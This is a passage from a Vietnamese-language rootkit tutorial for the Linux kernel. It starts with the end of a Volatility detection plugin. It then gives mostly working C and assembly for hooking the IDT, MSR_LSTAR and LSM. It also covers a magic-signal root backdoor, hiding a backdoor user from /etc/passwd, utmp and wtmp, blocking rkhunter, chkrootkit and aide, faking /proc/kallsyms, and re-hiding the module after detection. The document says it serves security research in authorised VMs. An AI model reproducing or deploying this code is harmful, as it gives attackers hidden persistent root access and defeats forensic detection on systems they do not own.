                addr = int(entry)
                if addr < kernel_start or addr > kernel_end:
                    suspicious_syscalls.append((i, hex(addr)))
            except Exception:
                break

        for nr, addr in suspicious_syscalls:
            yield (0, (
                "Hooked Syscall",
                f"NR {nr}",
                f"Handler at {addr} (outside kernel text)",
                "HIGH"
            ))

        # Check 3: Inline hooks (MOV RAX + JMP RAX at function entry)
        check_funcs = [
            "sys_getdents64", "sys_kill", "sys_read",
            "tcp4_seq_show", "udp4_seq_show"
        ]
        for func_name in check_funcs:
            try:
                func_addr = vmlinux.object_from_symbol(
                    func_name).vol.offset
                # Read first 12 bytes
                data = layer.read(func_addr, 12)
                # Check for MOV RAX, imm64 (48 B8) + JMP RAX (FF E0)
                if data[0:2] == b'\x48\xb8' and \
                   data[10:12] == b'\xff\xe0':
                    target = int.from_bytes(data[2:10], 'little')
                    yield (0, (
                        "Inline Hook",
                        func_name,
                        f"Trampoline to {hex(target)}",
                        "CRITICAL"
                    ))
            except Exception:
                continue

        # Check 4: DKOM --- processes in memory not in task list
        # (Requires walking slab allocator --- simplified here)

    def run(self):
        return renderers.TreeGrid(
            [("Type", str), ("Target", str),
             ("Details", str), ("Severity", str)],
            self._generator())
```

---

*Tai lieu phuc vu nghien cuu bao mat. Thuc hanh trong VM duoc phep, tren he thong that yeu cau uy quyen.*

---
# Part IV — Advanced Techniques

## Appendix A: Advanced Hooking

### A.1 IDT Hooking

**Deep Kernel Internals: IDT Architecture trên x86-64**

IDT (Interrupt Descriptor Table) la bang 256 entries, moi entry la mot `gate_desc` struct 16 bytes:

```
struct gate_desc {
    u16 offset_low;    // bits [15:0] cua handler address
    u16 segment;       // code segment selector (thuong la __KERNEL_CS = 0x10)
    struct {
        u16 ist:3,     // Interrupt Stack Table index (0 = khong dung IST)
            zero:5,    // reserved bits
            type:4,    // gate type: 0xE = interrupt gate, 0xF = trap gate
            dpl:2,     // Descriptor Privilege Level (0 = kernel only, 3 = user)
            p:1;       // present bit (1 = valid entry)
    };
    u16 offset_middle; // bits [31:16]
    u32 offset_high;   // bits [63:32]
    u32 reserved;
};

Handler address = offset_high : offset_middle : offset_low (concatenated thanh 64-bit)
```

IDTR register chua base address va limit cua IDT. CPU dung `LIDT` de load, `SIDT` de store IDTR. Khi interrupt/exception xay ra, CPU doc `IDT[vector]` tu IDTR.base de tim handler.

Tren modern SMP kernels (multi-CPU), moi CPU co the co IDT copy rieng — kernel copy IDT sang per-CPU region de tranh contention. Khi hook IDT, phai cap nhat tren TAT CA CPUs hoac hook se chi active tren 1 CPU.

```c
/* idt_hook.c — IDT entry modification
 *
 * File chinh Chapter 2 Method 4 chi SCAN IDT de tim sys_call_table.
 * O day ta thuc su MODIFY IDT entry de redirect interrupt handler.
 *
 * IDT (Interrupt Descriptor Table):
 *   - 256 entries, moi entry = gate descriptor (16 bytes tren x86-64)
 *   - Moi entry tro toi handler function cho interrupt/exception do
 *   - CPU lookup IDT khi: INT instruction, hardware interrupt, exception
 *
 * Ky thuat: thay the handler cho INT 0x80 (legacy 32-bit syscall)
 * hoac exception handler (page fault, general protection, etc.)
 *
 * Tai sao IDT hooking it pho bien:
 *   - INT 0x80 deprecated tren 64-bit (dung SYSCALL instruction thay)
 *   - IDT modification de detect (LKRG check IDT integrity)
 *   - Chi 1 IDT per CPU (tren SMP phai hook tat ca CPUs)
 *   - Kernel 5.x+ co protections (ro_after_init)
 *
 * Van useful vi:
 *   - Hook exception handlers (page fault -> hide memory access)
 *   - Hook NMI handler (stealth debugging)
 *   - Mot so detection tools khong check IDT
 */

#include "rootkit.h"
#include <asm/desc.h>       /* gate_desc, idt_table */
#include <asm/desc_defs.h>  /* IDT entry structures */

/* IDT gate descriptor layout tren x86-64 (16 bytes):
 *
 *   Bytes 0-1:   offset_low   (bits 0-15 of handler address)
 *   Bytes 2-3:   segment      (code segment selector, usually 0x10)
 *   Byte  4:     ist          (Interrupt Stack Table index, 0-7)
 *   Byte  5:     type_attr    (gate type + DPL + present bit)
 *   Bytes 6-7:   offset_mid   (bits 16-31)
 *   Bytes 8-11:  offset_high  (bits 32-63)
 *   Bytes 12-15: reserved
 *
 * Handler address = offset_high:offset_mid:offset_low (64-bit)
 */

struct idt_backup {
    unsigned int   vector;       /* Interrupt vector number */
    gate_desc      original;     /* Saved original gate descriptor */
    unsigned long  orig_handler; /* Extracted original handler address */
};

static struct idt_backup idt_saved;

/* -- Extract handler address tu gate descriptor -- */
static unsigned long gate_to_addr(gate_desc *gate)
{
    unsigned long addr;

    addr  = (unsigned long)gate->offset_low;
    addr |= (unsigned long)gate->offset_middle << 16;
#ifdef CONFIG_X86_64
    addr |= (unsigned long)gate->offset_high << 32;
#endif
    return addr;
}

/* -- Lay IDT base address --
 *
 * SIDT instruction store IDT register (IDTR) vao memory.
 * IDTR chua: limit (2 bytes) + base address (8 bytes tren x86-64).
 * Base address = pointer toi IDT table trong memory.
 */
static gate_desc *get_idt_table(void)
{
    struct desc_ptr idtr;
    store_idt(&idtr);
    return (gate_desc *)idtr.address;
}

/* -- Custom INT 0x80 handler --
 *
 * Khi process chay INT 0x80 (legacy syscall):
 *   1. CPU lookup IDT[0x80]
 *   2. Jump toi handler address trong IDT entry
 *   3. Handler chay (ta control handler bay gio)
 *
 * Registry state khi INT 0x80 trigger:
 *   eax = syscall number
 *   ebx = arg1, ecx = arg2, edx = arg3
 *   esi = arg4, edi = arg5, ebp = arg6
 *
 * QUAN TRONG: handler phai:
 *   1. Save tat ca registers
 *   2. Xu ly (intercept/modify)
 *   3. Jump toi original handler HOAC return
 *   4. KHONG DUOC corrupt stack/registers
 */

/* Handler viet bang ASM vi phai control register state chinh xac */
extern void idt_hook_stub(void);

/* C handler goi tu ASM stub */
static void idt_hook_handler(struct pt_regs *regs)
{
    /* Intercept specific syscall numbers */
    if (regs->ax == __NR_getdents64) {
        /* Log hoac modify — tuy implementation */
    }
}
```

ASM stub (idt_hook_stub.S):

```asm
/* ASM stub cho IDT hook handler.
 *
 * pt_regs layout (tu struct pt_regs trong arch/x86/include/asm/ptrace.h):
 *   offset 0:   r15
 *   offset 8:   r14
 *   ...
 *   offset 104: rdi
 *   offset 112: orig_rax
 *
 * Stack grows DOWN. Phai push rdi FIRST (highest offset, pushed first
 * = highest address) -> r15 LAST (offset 0, pushed last = lowest = RSP).
 *
 * Sau tat ca pushes: RSP[0] = r15 <- DUNG vi r15 pushed cuoi cung.
 */

#include <linux/linkage.h>

.text
.code64

SYM_CODE_START(idt_hook_stub)
    cli

    /* Push theo thu tu KERNEL ENTRY: rdi first, r15 last.
     * Sau pushes: RSP tro toi pt_regs-compatible frame. */
    push %rdi       /* pt_regs offset 112 — pushed first = highest addr */
    push %rsi       /* pt_regs offset 104 */
    push %rdx       /* pt_regs offset 96 */
    push %rcx       /* pt_regs offset 88 */
    push %rax       /* pt_regs offset 80 (orig_rax) */
    push %r8        /* pt_regs offset 72 */
    push %r9        /* pt_regs offset 64 */
    push %r10       /* pt_regs offset 56 */
    push %r11       /* pt_regs offset 48 */
    push %rbx       /* pt_regs offset 40 */
    push %rbp       /* pt_regs offset 32 */
    push %r12       /* pt_regs offset 24 */
    push %r13       /* pt_regs offset 16 */
    push %r14       /* pt_regs offset 8 */
    push %r15       /* pt_regs offset 0 — pushed last = RSP points here */

    /* RSP bay gio = pointer toi r15 slot = pt_regs offset 0.
     * regs->r15 = RSP[0], regs->r14 = RSP[8], ..., regs->di = RSP[104]
     * MATCHES struct pt_regs layout! */
    mov %rsp, %rdi
    call idt_hook_handler

    /* Restore nguoc lai: r15 first (pop from RSP[0]) */
    pop %r15
    pop %r14
    pop %r13
    pop %r12
    pop %rbp
    pop %rbx
    pop %r11
    pop %r10
    pop %r9
    pop %r8
    pop %rax
    pop %rcx
    pop %rdx
    pop %rsi
    pop %rdi

    jmp *orig_idt_handler_addr(%rip)
SYM_CODE_END(idt_hook_stub)

.data
SYM_DATA(orig_idt_handler_addr, .quad 0)
```

```c
/* -- Build modified gate descriptor -- */
static void build_gate(gate_desc *gate, unsigned long handler)
{
    /* Pack 64-bit address vao 3 offset fields */
    gate->offset_low    = (u16)(handler & 0xFFFF);
    gate->offset_middle = (u16)((handler >> 16) & 0xFFFF);
#ifdef CONFIG_X86_64
    gate->offset_high   = (u32)((handler >> 32) & 0xFFFFFFFF);
#endif
    /* Giu nguyen segment, IST, type, DPL, present tu original */
}

/* -- Install IDT hook -- */
static int install_idt_hook(unsigned int vector, void *new_handler)
{
    gate_desc *idt;
    gate_desc new_gate;

    if (vector > 255)
        return -EINVAL;

    idt = get_idt_table();

    /* Backup original entry */
    idt_saved.vector = vector;
    memcpy(&idt_saved.original, &idt[vector], sizeof(gate_desc));
    idt_saved.orig_handler = gate_to_addr(&idt[vector]);

    /* Build new gate descriptor */
    memcpy(&new_gate, &idt[vector], sizeof(gate_desc));
    build_gate(&new_gate, (unsigned long)new_handler);

    /* Write new entry — can bypass write protection.
     *
     * IDT nam trong read-only memory tren kernel moi.
     * Phai dung set_memory_rw hoac PTE manipulation.
     * Hoac: dung write_idt_entry() kernel API neu available. */
    rk_unprotect_memory();

    /* Phai update tren ALL CPUs (SMP safety).
     * Moi CPU CO THE co IDT rieng (nhung thuong share).
     * load_idt() per-CPU neu can. */
    unsigned long flags;
    local_irq_save(flags);
    memcpy(&idt[vector], &new_gate, sizeof(gate_desc));
    local_irq_restore(flags);

    rk_protect_memory();

    pr_info("rk: IDT[%u] hooked: %px -> %px\n",
            vector, (void *)idt_saved.orig_handler, new_handler);
    return 0;
}

/* -- Remove IDT hook -- */
static void remove_idt_hook(void)
{
    gate_desc *idt = get_idt_table();
    unsigned long flags;

    rk_unprotect_memory();
    local_irq_save(flags);
    memcpy(&idt[idt_saved.vector], &idt_saved.original, sizeof(gate_desc));
    local_irq_restore(flags);
    rk_protect_memory();

    pr_info("rk: IDT[%u] restored\n", idt_saved.vector);
}
```

---

### A.2 MSR Hooking

**Deep Kernel Internals: Model-Specific Registers (MSRs)**

MSR (Model-Specific Registers) la cac CPU configuration registers truy cap qua hai instructions dac biet:
- `RDMSR`: doc MSR. ECX = MSR index, ket qua trong EDX:EAX (64-bit value).
- `WRMSR`: ghi MSR. ECX = MSR index, EDX:EAX = gia tri ghi.

Cac MSR quan trong cho rootkit hooking:

```
MSR_LSTAR  (0xC0000082) — Dia chi entry_SYSCALL_64, CPU jump toi day khi SYSCALL
MSR_STAR   (0xC0000081) — Segment selectors cho SYSCALL/SYSRET transition
MSR_FMASK  (0xC0000084) — RFLAGS mask: bits nao bi clear khi SYSCALL execute
IA32_SYSENTER_EIP (0x176) — 32-bit SYSENTER entry point (legacy, compat mode)
```

Diem quan trong: MSR la **per-CPU register** — moi CPU core co gia tri MSR rieng. Ghi MSR_LSTAR tren CPU 0 khong anh huong CPU 1. De hook toan he thong, phai dung `on_each_cpu()` de thuc thi WRMSR tren moi CPU qua IPI (Inter-Processor Interrupt).

```c
/* msr_hook.c — SYSCALL entry point redirection via MSR_LSTAR
 *
 * File chinh Chapter 2 Method 3 chi DOC MSR_LSTAR.
 * O day ta GHI MSR_LSTAR de redirect syscall entry.
 *
 * MSR_LSTAR (0xC0000082):
 *   Chua address cua entry_SYSCALL_64 — function kernel chay
 *   moi khi userspace execute SYSCALL instruction.
 *
 * SYSCALL flow binh thuong:
 *   User: SYSCALL -> CPU reads MSR_LSTAR -> jump toi entry_SYSCALL_64
 *   -> entry_SYSCALL_64 save regs -> lookup sys_call_table -> call handler
 *
 * SYSCALL flow sau MSR hook:
 *   User: SYSCALL -> CPU reads MSR_LSTAR -> jump toi OUR handler
 *   -> OUR handler: intercept -> call original entry_SYSCALL_64
 *
 * Uu diem:
 *   - Hook TAT CA syscalls cung luc (khong can hook tung entry)
 *   - Sau hon syscall table hooking
 *   - Mot so detection tools chi check syscall table, khong check MSR
 *
 * Nhuoc diem:
 *   - Phai handle tren TUNG CPU (MSR la per-CPU register)
 *   - Rat de crash neu handler code sai (brick he thong)
 *   - LKRG va mot so tools check MSR_LSTAR
 *   - Performance impact neu handler khong toi uu
 *
 * MSR_LSTAR hooking yeu cau:
 *   - Perfect ASM stub compatible voi TUNG kernel build
 *   - Handle KPTI page table switch
 *   - Handle spectre mitigations
 *   - Hardcoded GS offsets vary per kernel build -> not portable
 *
 * Approach an toan: Hook entry_SYSCALL_64 via ftrace thay vi
 * modify MSR truc tiep. Ket qua tuong duong, an toan hon nhieu.
 * Xem Chapter 4 ftrace hooking cho full implementation.
 *
 * Neu THAT SU can MSR hook, dung approach sau:
 * dung on_each_cpu + wrmsr, redirect toi trampoline allocated bang
 * __vmalloc(PAGE_KERNEL_EXEC) chua:
 *   1. Full register save (matching kernel's own entry code)
 *   2. Call C filter
 *   3. Check return -> jmp original or sysret
 *
 * Template-based: copy kernel's own entry_SYSCALL_64 code,
 * patch in our filter call.
 */

#include "rootkit.h"
#include <asm/msr.h>

static unsigned long orig_lstar;

/* -- C callback — goi tu trampoline khi syscall number match -- */
static long msr_hook_filter(unsigned long syscall_nr,
                             struct pt_regs *regs)
{
    /* Vi du: intercept kill() for magic signal */
    if (syscall_nr == __NR_kill) {
        pid_t pid = (pid_t)regs->di;
        int sig = (int)regs->si;
        if (sig == MAGIC_SIGNAL && pid == MAGIC_PID) {
            /* Give root — xu ly trong day */
            struct cred *new = prepare_creds();
            if (new) {
                new->uid.val = new->euid.val = 0;
                new->gid.val = new->egid.val = 0;
                new->cap_effective = CAP_FULL_SET;
                new->cap_permitted = CAP_FULL_SET;
                commit_creds(new);
            }
            return 0;  /* Intercepted — don't call original */
        }
    }
    return -1;  /* Not intercepted — proceed to original */
}

/* -- Read original MSR_LSTAR va save -- */
static int msr_hook_save(void)
{
    rdmsrl(MSR_LSTAR, orig_lstar);
    pr_info("rk: original SYSCALL entry: %px\n", (void *)orig_lstar);
    return 0;
}

/* -- Restore original MSR_LSTAR tren tat ca CPUs --
 *
 * MSR_LSTAR la per-CPU: moi CPU core co gia tri rieng.
 * Phai update tren TAT CA CPUs.
 *
 * on_each_cpu(): goi function tren moi CPU (IPI = Inter-Processor Interrupt).
 * Function chay trong interrupt context tren moi CPU.
 */
static void msr_hook_restore_cpu(void *info)
{
    wrmsrl(MSR_LSTAR, orig_lstar);
}

static void msr_hook_remove(void)
{
    on_each_cpu(msr_hook_restore_cpu, NULL, 1);
    pr_info("rk: MSR_LSTAR restored\n");
}

/* Cho educational purposes, hook syscall entry via ftrace thay vi
 * modify MSR truc tiep. Ket qua tuong duong, an toan hon nhieu.
 * Xem Chapter 4 ftrace hooking cho implementation. */
```

---

### A.3 LSM Hook Abuse

**Deep Kernel Internals: LSM Framework Architecture**

LSM (Linux Security Modules) framework hoat dong qua struct `security_hook_heads` — mot struct chua `hlist_head` cho MOI security hook point (hang tram hook points). Moi registered security module (SELinux, AppArmor, SMACK) them `security_hook_list` entries vao cac hlist nay.

Khi kernel thuc hien permission check (vd: mo file, tao process, ket noi socket), no goi `security_*()` function tuong ung. Function nay iterate qua hlist cua hook do, goi tung registered callback. **TAT CA callbacks phai return 0** de operation duoc phep — bat ky callback nao return non-zero se block operation.

```
security_file_permission(file, mask)
  -> iterate security_hook_heads.file_permission hlist
     -> SELinux: selinux_file_permission() -> return 0 (allow) hoac -EACCES
     -> AppArmor: apparmor_file_permission() -> return 0 hoac -EACCES
     -> Rootkit: rk_file_permission() -> return 0 (luon allow) hoac -ENOENT (an file)
```

Rootkit co the: (1) them hook rieng luon return 0 de bypass moi check, (2) xoa hooks cua SELinux/AppArmor khoi hlist de vo hieu hoa chung, hoac (3) dang ky hook tra ve -ENOENT/EACCES de block truy cap vao rootkit files.

```c
/* lsm_abuse.c — Lam dung Linux Security Module framework
 *
 * LSM = framework cho phep security modules (SELinux, AppArmor, SMACK)
 * hook vao kernel operations. Moi sensitive operation goi
 * security_*() function -> LSM hook chain.
 *
 * Rootkit abuse: dang ky LSM module gia -> hook moi security-sensitive
 * operation (file access, process creation, socket operations, etc.)
 *
 * Uu diem so voi syscall hooking:
 *   - LSM hooks o DUNG security decision point
 *   - Hang tram hook points (nhieu hon syscall table)
 *   - "Legitimate" — admin cai LSM module = binh thuong
 *   - Stacking LSM (kernel 5.x+): nhieu LSMs cung luc
 *
 * Nhuoc diem:
 *   - LSM registration API restricted (security_add_hooks)
 *   - Kernel CONFIG_LSM_STACKING hoac CONFIG_SECURITY can enabled
 *   - Mot so kernel khong cho register LSM sau boot
 *
 * APT context: Winnti group exploit LSM-like mechanisms.
 */

#include "rootkit.h"
#include <linux/lsm_hooks.h>   /* security_hook_list, cac macro */
#include <linux/security.h>

/* -- LSM Hook: file_permission --
 *
 * Goi moi khi process access file. Co the:
 *   - Log tat ca file access
 *   - Block access toi specific files
 *   - Hide files (return -ENOENT cho "invisible" files)
 */
static int rk_file_permission(struct file *file, int mask)
{
    char buf[256];
    char *path;

    if (!file || !file->f_path.dentry)
        return 0;  /* Allow */

    path = d_path(&file->f_path, buf, sizeof(buf));
    if (IS_ERR(path))
        return 0;

    /* An rootkit files: return -ENOENT khi ai doc file rootkit */
    if (strstr(path, HIDDEN_PREFIX))
        return -ENOENT;  /* File "khong ton tai" */

    return 0;  /* Allow moi thu khac */
}

/* -- LSM Hook: task_kill --
 *
 * Goi khi process gui signal. Intercept magic signal.
 */
static int rk_task_kill(struct task_struct *p, struct kernel_siginfo *info,
                         int sig, const struct cred *cred)
{
    if (sig == MAGIC_SIGNAL) {
        /* Xu ly magic signal — give root, hide process, etc. */
        return 0;  /* Allow (da xu ly trong syscall hook) */
    }
    return 0;
}

/* -- LSM Hook: inode_permission --
 *
 * Goi TRUOC moi inode access. Sau hon file_permission.
 * Control access toi files, directories, devices.
 */
static int rk_inode_permission(struct inode *inode, int mask)
{
    /* Co the dung de:
     * - Block read access toi /sys/kernel/debug/kprobes/list
     *   (chong detection)
     * - Block write toi rootkit persistence files
     *   (chong removal) */
    return 0;
}

/* -- LSM Hook: socket_connect --
 *
 * Goi khi process connect() socket. Monitor outbound connections.
 */
static int rk_socket_connect(struct socket *sock,
                               struct sockaddr *address,
                               int addrlen)
{
    if (address->sa_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)address;
        /* Log moi outbound TCP connection */
        pr_info("rk: connect to %pI4:%d\n",
                &sin->sin_addr, ntohs(sin->sin_port));
    }
    return 0;
}

/* -- LSM Hook: bprm_check_security --
 *
 * Goi TRUOC moi execve. Co the block execution hoac log.
 * Tai day ta CO QUYEN noi "no" cho execution.
 */
static int rk_bprm_check(struct linux_binprm *bprm)
{
    /* Block specific binaries (anti-forensics tools) */
    if (bprm->filename) {
        if (strstr(bprm->filename, "rkhunter") ||
            strstr(bprm->filename, "chkrootkit") ||
            strstr(bprm->filename, "aide")) {
            /* Return -EACCES = "Permission denied" khi chay detection tool.
             * Hoac: khong block ma chi log (stealth hon). */
            return -EACCES;
        }
    }
    return 0;
}

/* -- Dang ky LSM hooks --
 *
 * Tren kernel co CONFIG_SECURITY=y, ta dung security_add_hooks().
 * Tuy nhien API nay thuong restricted (not exported).
 *
 * Workaround: Tim security_hook_heads (struct chua list heads
 * cho moi hook type) qua kallsyms, roi list_add truc tiep.
 *
 * Day la DKOM approach cho LSM — them hook truc tiep vao
 * linked list thay vi dung official API.
 */

struct security_hook_heads *rk_hook_heads = NULL;

/* Hook list entries — moi entry link vao mot hook chain */
static struct security_hook_list rk_hooks[] = {
    /* Macro LSM_HOOK_INIT tao security_hook_list entry:
     *   .head = &security_hook_heads->hook_name
     *   .hook.hook_name = function pointer */
    LSM_HOOK_INIT(file_permission, rk_file_permission),
    LSM_HOOK_INIT(inode_permission, rk_inode_permission),
    LSM_HOOK_INIT(task_kill, rk_task_kill),
    LSM_HOOK_INIT(socket_connect, rk_socket_connect),
    LSM_HOOK_INIT(bprm_check_security, rk_bprm_check),
};

int rk_lsm_install(void)
{
    /* Tim security_hook_heads structure */
    rk_hook_heads = (struct security_hook_heads *)
        rk_lookup_name("security_hook_heads");

    if (!rk_hook_heads) {
        pr_err("rk: security_hook_heads not found\n");
        return -ENOENT;
    }

    /* Truc tiep add hooks vao linked lists (DKOM approach).
     * Moi hook type trong security_hook_heads la hlist_head.
     * Ta add entry vao cuoi list. */
    int i;
    for (i = 0; i < ARRAY_SIZE(rk_hooks); i++) {
        struct security_hook_list *shook = &rk_hooks[i];
        /* hlist_add_tail_rcu: add vao cuoi list, RCU-safe.
         * Hooks moi active cho moi subsequent security checks. */
        hlist_add_tail_rcu(&shook->list, shook->head);
    }

    pr_info("rk: %d LSM hooks installed\n", (int)ARRAY_SIZE(rk_hooks));
    return 0;
}

void rk_lsm_remove(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(rk_hooks); i++) {
        hlist_del_rcu(&rk_hooks[i].list);
    }
    synchronize_rcu();
    pr_info("rk: LSM hooks removed\n");
}
```

---

## Appendix B: Advanced Hiding & Evasion

### B.1 User Hiding

```c
/* user_hide.c — An user khoi /etc/passwd, utmp, wtmp, lastlog
 *
 * Khi attacker tao backdoor user, user do visible qua:
 *   1. /etc/passwd — `cat /etc/passwd` hoac `getent passwd`
 *   2. utmp (/var/run/utmp) — `who`, `w` (logged-in users)
 *   3. wtmp (/var/log/wtmp) — `last` (login history)
 *   4. lastlog (/var/log/lastlog) — `lastlog` (last login per user)
 *
 * Strategy: hook read() syscall, filter output cho files tren.
 * utmp/wtmp la BINARY format -> can parse struct utmp.
 */

#include "rootkit.h"
#include <linux/uaccess.h>

#define HIDDEN_USER "rk_user"

/* -- struct utmp layout --
 *
 * Defined in <utmp.h> (userspace), ta define lai cho kernel:
 *
 * Moi entry = 384 bytes (tren x86-64).
 * utmp, wtmp dung cung format — chi khac file path.
 */
#define UT_NAMESIZE  32
#define UT_LINESIZE  32
#define UT_HOSTSIZE  256

struct kernel_utmp {
    short   ut_type;                   /* 2 bytes — Type of login */
    pid_t   ut_pid;                    /* 4 bytes — PID of login process */
    char    ut_line[UT_LINESIZE];      /* 32 bytes — TTY name - "/dev/" */
    char    ut_id[4];                  /* 4 bytes — Terminal name suffix */
    char    ut_user[UT_NAMESIZE];      /* 32 bytes — Username */
    char    ut_host[UT_HOSTSIZE];      /* 256 bytes — Hostname for remote login */
    struct {
        short e_termination;           /* 2 bytes */
        short e_exit;                  /* 2 bytes */
    } ut_exit;                         /* 4 bytes total */
    long    ut_session;                /* 4 or 8 bytes */
    struct {
        int32_t tv_sec;
        int32_t tv_usec;
    } ut_tv;                           /* 8 bytes */
    int32_t ut_addr_v6[4];             /* 16 bytes */
    char    __unused[20];              /* 20 bytes padding */
};

/* sizeof(struct kernel_utmp) should equal 384 bytes on x86-64.
 * Verify with: _Static_assert(sizeof(struct kernel_utmp) == 384, ...); */

#define UTMP_ENTRY_SIZE sizeof(struct kernel_utmp)  /* 384 bytes */

/* -- Filter /etc/passwd output --
 *
 * /etc/passwd la text file, moi dong:
 *   username:x:uid:gid:comment:home:shell
 *
 * Hook read() cho /etc/passwd, filter dong chua HIDDEN_USER.
 * Logic giong hooked_read cho /proc/modules (Chapter 3).
 */
static long filter_passwd_read(const struct pt_regs *regs,
                                long orig_ret)
{
    int fd = (int)regs->di;
    char __user *user_buf = (char __user *)regs->si;
    char *kern_buf, *src, *dst;
    long new_ret;

    if (orig_ret <= 0) return orig_ret;

    /* Check neu dang doc /etc/passwd */
    if (!is_target_file(fd, "/etc/passwd"))
        return orig_ret;

    kern_buf = kzalloc(orig_ret + 1, GFP_KERNEL);
    if (!kern_buf) return orig_ret;

    if (copy_from_user(kern_buf, user_buf, orig_ret)) {
        kfree(kern_buf);
        return orig_ret;
    }
    kern_buf[orig_ret] = '\0';

    /* Filter: remove lines chua HIDDEN_USER */
    src = kern_buf;
    dst = kern_buf;
    new_ret = 0;

    while (*src) {
        char *eol = strchr(src, '\n');
        int line_len = eol ? (eol - src + 1) : strlen(src);

        if (!strnstr(src, HIDDEN_USER, line_len)) {
            /* Giu dong nay */
            if (dst != src)
                memmove(dst, src, line_len);
            dst += line_len;
            new_ret += line_len;
        }
        /* Else: skip dong (an user) */

        src += line_len;
    }

    if (new_ret > 0)
        copy_to_user(user_buf, kern_buf, new_ret);

    kfree(kern_buf);
    return new_ret;
}

/* -- Filter utmp/wtmp binary records --
 *
 * utmp/wtmp chua array of struct utmp (384 bytes moi entry).
 * read() return N * 384 bytes.
 * Filter: remove entries co ut_user == HIDDEN_USER.
 */
static long filter_utmp_read(const struct pt_regs *regs,
                              long orig_ret,
                              const char *target_path)
{
    int fd = (int)regs->di;
    char __user *user_buf = (char __user *)regs->si;
    char *kern_buf;
    long new_ret = 0;
    int i, num_entries;

    if (orig_ret <= 0) return orig_ret;
    if (!is_target_file(fd, target_path))
        return orig_ret;

    kern_buf = kzalloc(orig_ret, GFP_KERNEL);
    if (!kern_buf) return orig_ret;

    if (copy_from_user(kern_buf, user_buf, orig_ret)) {
        kfree(kern_buf);
        return orig_ret;
    }

    num_entries = orig_ret / UTMP_ENTRY_SIZE;

    /* Iterate entries, compact visible ones */
    for (i = 0; i < num_entries; i++) {
        struct kernel_utmp *entry =
            (struct kernel_utmp *)(kern_buf + i * UTMP_ENTRY_SIZE);

        if (strncmp(entry->ut_user, HIDDEN_USER,
                    strlen(HIDDEN_USER)) == 0) {
            /* Hidden user entry — skip */
            continue;
        }

        /* Visible entry — copy toi output position */
        if (new_ret != i * UTMP_ENTRY_SIZE)
            memmove(kern_buf + new_ret, entry, UTMP_ENTRY_SIZE);
        new_ret += UTMP_ENTRY_SIZE;
    }

    if (new_ret > 0)
        copy_to_user(user_buf, kern_buf, new_ret);

    kfree(kern_buf);
    return new_ret;
}

/* -- Tich hop vao hooked_read --
 *
 * Them vao hooked_read() (Chapter 3):
 *
 * static asmlinkage long hooked_read(const struct pt_regs *regs)
 * {
 *     long ret = orig_read(regs);
 *     ret = filter_passwd_read(regs, ret);
 *     ret = filter_utmp_read(regs, ret, "/var/run/utmp");
 *     ret = filter_utmp_read(regs, ret, "/var/log/wtmp");
 *     return ret;
 * }
 *
 * lastlog: dung /var/log/lastlog, format khac (struct lastlog = 292 bytes).
 * Can filter tuong tu nhung index by UID (record position = UID * sizeof).
 */
```

---

### B.2 Syscall Table Integrity Evasion

```c
/* evasion.c — Evade syscall table integrity checks
 *
 * Detection tools (rkhunter, LKRG, custom scripts) verify:
 *   "Do syscall table entries point vao kernel text section?"
 *   Neu entry tro ngoai [_stext, _etext] -> hooked.
 *
 * Evasion techniques:
 *   1. Shadow syscall table (maintain clean copy cho checks)
 *   2. Restore-on-check (detect checker running, temp restore)
 *   3. Hook detection function itself
 * ══════════════════════════════════════════════════════════════ */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * Method 1: Detect-and-restore
 *
 * Khi detection tool chay (rkhunter, chkrootkit):
 *   1. Detect execution qua execve hook
 *   2. Temporarily restore original syscall entries
 *   3. Tool scan -> thay clean table -> report "OK"
 *   4. Re-install hooks sau khi tool exit
 *
 * Detection tools thuong chi scan 1 lan roi exit.
 * Window chi can vai giay.
 * ══════════════════════════════════════════════════════════════ */

static bool evasion_active = false;

/* Goi tu execve hook (Chapter 5) khi phat hien detection tool */
static void rk_evade_checker(const char *tool_name)
{
    if (evasion_active) return;
    evasion_active = true;

    pr_info("rk: detection tool '%s' — activating evasion\n", tool_name);

    /* Temporarily remove hooks */
    rk_remove_hooks();

    /* Schedule re-installation sau delay.
     * Dung delayed workqueue:
     *   schedule_delayed_work(&rehook_work, 5 * HZ);
     *   -> 5 giay sau, hooks reinstalled.
     */
}

static void rehook_fn(struct work_struct *work)
{
    rk_install_hooks();
    evasion_active = false;
    pr_info("rk: hooks re-installed after evasion\n");
}

static DECLARE_DELAYED_WORK(rehook_work, rehook_fn);

/* Integrate vao execve handler:
 *
 * if (strstr(filename, "rkhunter") || strstr(filename, "chkrootkit"))
 *     rk_evade_checker(filename);
 *     schedule_delayed_work(&rehook_work, 5 * HZ);
 */

/* ══════════════════════════════════════════════════════════════
 * Method 2: Shadow read of /proc/kallsyms
 *
 * Detection scripts compare syscall table entries vs kallsyms.
 * Hook read() on /proc/kallsyms -> return ORIGINAL addresses
 * cho hooked syscalls.
 *
 * Script thay: sys_getdents64 = 0xffffffff81234000
 * Syscall table[getdents64] = 0xffffffff81234000 (original)
 * -> "Match! Table clean."
 *
 * Thuc te: syscall table[getdents64] = 0xffffffffc0a00000 (hook)
 * Nhung read hook return fake address cho /proc/kallsyms.
 * ══════════════════════════════════════════════════════════════ */

/* Giong filter_passwd_read nhung cho /proc/kallsyms:
 * Replace hook address strings voi original address strings.
 * Tich hop vao hooked_read() Chapter 3.
 *
 * Dung %016lx cho raw hex address strings.
 * Khong dung %pK vi kptr_restrict > 0 se in "0000000000000000"
 * hoac "(____ptrval____)". */
    snprintf(hook_hex, sizeof(hook_hex), "%016lx",
             shadow_table[i].hook_addr);
    snprintf(orig_hex, sizeof(orig_hex), "%016lx",
             shadow_table[i].orig_addr);

/* ══════════════════════════════════════════════════════════════
 * Method 3: Watchdog — Verify module stays hidden
 *
 * Periodically check neu rootkit module van hidden trong
 * modules list. Neu bi expose lai -> re-hide.
 *
 * Dung global "modules" list head thay vi THIS_MODULE.
 * list_for_each_entry(pos, &THIS_MODULE->list, list)
 * KHONG BAO GIO visit THIS_MODULE (no la sentinel).
 * ══════════════════════════════════════════════════════════════ */
    struct list_head *modules_head;
    struct module *mod;

    modules_head = (struct list_head *)rk_lookup_name("modules");
    if (!modules_head) goto skip_check2;

    list_for_each_entry(mod, modules_head, list) {
        if (strcmp(mod->name, MODULE_NAME_STR) == 0) {
            /* Module visible trong list -> re-hide */
            rk_hide_module();
            break;
        }
    }
skip_check2:
```

---

## Appendix C: Advanced Privilege Escalation

### C.1 SELinux/AppArmor Bypass

